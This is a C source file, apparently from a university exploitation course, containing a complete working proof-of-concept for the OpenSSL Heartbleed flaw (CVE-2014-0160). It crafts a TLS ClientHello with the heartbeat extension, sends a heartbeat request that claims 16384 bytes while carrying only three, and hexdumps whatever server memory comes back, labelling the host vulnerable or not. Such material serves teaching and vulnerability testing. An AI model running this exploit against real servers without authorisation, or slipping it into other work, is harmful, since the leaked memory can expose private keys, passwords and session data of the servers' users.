/**
 * @Author: Guillermo Escobero, Alvaro Santos
 * @Date:   12-12-2020
 * @Project: Software Systems Exploitation
 * @Filename: heartbleed.c
 * @Last modified by:   Guillermo Escobero, Alvaro Santos
 * @Last modified time: 13-12-2020
 */

/* PoC for CVE-2014-0160 (OpenSSL Heartbleed vulnerability) */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#define HEADER_SIZE 5  /* Content type + Version + Length (1 + 2 + 2) */
#define BUF_SIZE 65536 /* Maximum heartbleed payload is 0xFFFF */
#define TIMEOUT 5      /* 5-seconds timeout */

/* SSL/TLS Content types */
#define ALERT_PROT 21
#define HANDSHAKE_PROT 22
#define HEARTBEAT_PROT 24

#define SERVER_HELLO 2
#define CERTIFICATE 11
#define SERVER_KEY_EXCHANGE 12
#define SERVER_HELLO_DONE 14

/* SSL/TLS Client Hello message */
uint8_t hello[] = {
    /* HANDSHAKE protocol (type 22) */
    0x16,
    /* Version = TLSv1.1 (ssl 3.2) */
    0x03, 0x02,
    /* Length = 220 bytes */
    0x00, 0xdc,
      /* Client Hello message */
      0x01,
      /* Length = 216 bytes */
      0x00, 0x00, 0xd8,
      /* Version = TLSv1.1 (ssl 3.2) */
      0x03, 0x02,
      /* Random */
      0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
      0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
      0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,
      0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,
      /* Session ID length (0, create a new session)*/
      0x00,
      /* Ciphersuites length */
      0x00, 0x66,
        /* Ciphersuites IDs (2 bytes each) */
        0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
        0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
        0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,
        0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,
        0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,
        0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,
        0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,
        0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,
        0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,
        0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,
        0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,
        0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,
        0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
      /* Compression parameters (null: not supported)*/
      0x01, 0x00,
      /* Extensions length */
      0x00, 0x49,
        /* ec_point_formats */
        0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
        /* supported_groups */
        0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,
        0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
        0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,
        0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
        0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,
        0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
        0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,
        /* session_ticket (new session, so it's empty)*/
        0x00, 0x23, 0x00, 0x00,
        /* HEARTBEAT EXTENSION mode: 1 */
        0x00, 0x0f, 0x00, 0x01, 0x01
};

/**
 * HEARTBEAT MESSAGE (https://tools.ietf.org/html/rfc6520)
 *
 * ssl_msg.type    (1 byte)  = 24 (Heartbeat protocol)
 * ssl_msg.version (2 bytes) = TLS 1.1 (SSL 3.2)
 * ssl_msg.length  (1 byte)  = 3
 *
 * ssl_msg.hb_msg.type           (1 byte)  = 1 (heartbeat_request)
 * ssl_msg.hb_msg.payload_length (2 bytes) = 16384
 *
 * This message is crafted to request more bytes than the payload sent!
 *
 */
uint8_t hb[] = { 0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0x40, 0x00 };

/**
 * Receives HEADER_SIZE bytes from a socket and retrieves the TLS message type
 * and length of the payload.
 * Returns 0 on success.
 * Returns -1 on failure.
 */
int recv_header(int sock, unsigned char *type, unsigned short *length)
{
    uint8_t buf[HEADER_SIZE] = {0,};
    uint8_t *ptr = buf;
    int k = 0;
    *length = HEADER_SIZE;
    while (*length > 0)
    {
        k = recv(sock, ptr, *length, 0);
        if (k == -1)
            return -1;

        ptr += k;
        *length -= k;
    }
    *type = buf[0];
    *length = (buf[3] << 8) | buf[4];

    return 0;
}

/**
 * Receives bytes from a socket and saves them in a buffer.
 * Returns 0 on success.
 * Returns -1 on failure.
 */
int recv_buffer(int sock, unsigned short length, unsigned char *buffer)
{
    uint8_t *ptr = buffer;
    int k = 0;
    while (length > 0)
    {
        k = recv(sock, ptr, length, 0);
        if (k == -1)
            return -1;

        ptr += k;
        length -= k;
    }
    return 0;
}

/**
 * Sends bytes contained in a buffer over a socket.
 * Returns 0 on success.
 * Returns -1 on failure.
 */
int send_buffer(int sock, unsigned char *buffer, unsigned short length)
{
    int k = 0;
    uint8_t *ptr = buffer;
    while (length > 0)
    {
        k = send(sock, ptr, length, 0);
        if (k == -1)
            return -1;

        ptr += k;
        length -= k;
    }
    return 0;
}

/**
 * Prints the contents of a buffer to stdout in hexadecimal and ASCII formats.
 */
static void hexdump(unsigned char *buf, unsigned long length)
{
    unsigned long i, j;

    /* 16 bytes per line */
    for (i = 0; i < length; i += 16)
    {
        printf(" %06lx: ", i);
        /* Print data in hexadecimal first */
        for (j = 0; j < 16 && j < length-i; ++j)
            printf("%02x ", buf[i+j]);

        printf(" ");
        /* Now print the same data in ASCII format */
        for (j = 0; j < 16 && j < length-i; ++j)
        {
            uint8_t ch = buf[i+j];
            /* Not printable ASCII? Print a dot instead */
            if (ch < 32 || ch > 126)
                ch = '.';

            printf("%c", ch);
        }
        printf("\n");
    }
}

static char* get_type_name(unsigned short type)
{
  switch (type) {
    case ALERT_PROT:
          return "Alert";
    case HANDSHAKE_PROT:
          return "Handshake Protocol";
    case HEARTBEAT_PROT:
          return "HeartBeat Protocol";

    case SERVER_HELLO:
          return "Server Hello";
    case CERTIFICATE:
          return "Certificate";
    case SERVER_KEY_EXCHANGE:
          return "ServerKeyExchange";
    case SERVER_HELLO_DONE:
          return "ServerHelloDone";
    default:
          return "unknown";
  }
}

int main(int argc, char const *argv[]) {

  if (argc != 3)
  {
    printf("Usage: %s <IPv4 address> <Port>\n", argv[0]);
    return 0;
  }

  /* Create socket */
  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd == -1)
  {
    printf("ERROR: Could not create socket\n");
    return 0;
  }

  /* Set timeout to socket */
  struct timeval tv;
  tv.tv_sec = TIMEOUT;
  tv.tv_usec = 0;
  setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);

  struct sockaddr_in server_addr;
  memset(&server_addr, 0, sizeof(server_addr));
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(atoi(argv[2]));

  if (inet_pton(AF_INET, argv[1], &server_addr.sin_addr) != 1)
  {
    printf("ERROR: Invalid server IP address\n");
    close(sockfd);
    return 0;
  }

  if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)))
  {
    printf("ERROR: Could not connect to server\n");
    close(sockfd);
    return 0;
  }

  printf("Sending Client Hello... ");
  if (send_buffer(sockfd, hello, sizeof(hello)))
  {
    printf("\nERROR: Error while sending Client Hello\n");
    goto finish;
  }
  printf("OK\n");

  /* Allocate memory for receiving data */
  unsigned char *buf = malloc(BUF_SIZE);
  memset(buf, 0, BUF_SIZE);

  printf("Waiting for server response...\n");
  unsigned char type = 0;
  unsigned short length = 0;

  /* Loop until server finishes sending ServerHello, Certificate... */
  for (;;)
  {
    /* Read the header of the message */
    if (recv_header(sockfd, &type, &length))
    {
      printf("Error while receiving data\n");
      goto finish;
    }
    /* Read the rest of the message */
    if (recv_buffer(sockfd, length, buf))
    {
      printf("Error while receiving data\n");
      goto finish;
    }
    printf("\tReceived TLS message, %s, %s\n",
            get_type_name(type), get_type_name(buf[0]));
    /* Has server finished sending messages? Server Hello Done message? */
    if (type == HANDSHAKE_PROT && buf[0] == SERVER_HELLO_DONE)
      break;
  }

  printf("Sending HeartBeat request... ");
  if (send_buffer(sockfd, hb, sizeof(hb)))
  {
    printf("\nError while sending HeartBeat request\n");
    goto finish;
  }
  printf("OK\n");

  printf("Receiving HeartBeat response... ");
  memset(buf, 0, BUF_SIZE);
  if (recv_header(sockfd, &type, &length))
  {
    printf("\nError while receiving HB header. ");
    printf("Server did not reply to our HeartBeat request. ");
    printf("Probably not vulnerable.\n");
    goto finish;
  }
  printf("OK\n");

  if (type != HEARTBEAT_PROT)
  {
    printf("Expected a HeartBeat response. ");
    printf("Instead, we received a %s message. Probably not vulnerable.",
            get_type_name(type));
    goto finish;
  }

  if (recv_buffer(sockfd, length, buf))
  {
    printf("Error while receiving HeartBeat data\n");
    goto finish;
  }

  hexdump(buf, length);

  if (length <= 3) /* Our HB request just contains 3 bytes... */
    printf("Host %s:%s is NOT vulnerable! Replied with %d bytes!\n",
            argv[1], argv[2], length);
  else
    printf("Host %s:%s is VULNERABLE! Replied with %d bytes!\n",
            argv[1], argv[2], length);

finish:
  free(buf);
  close(sockfd);

  return 0;
}
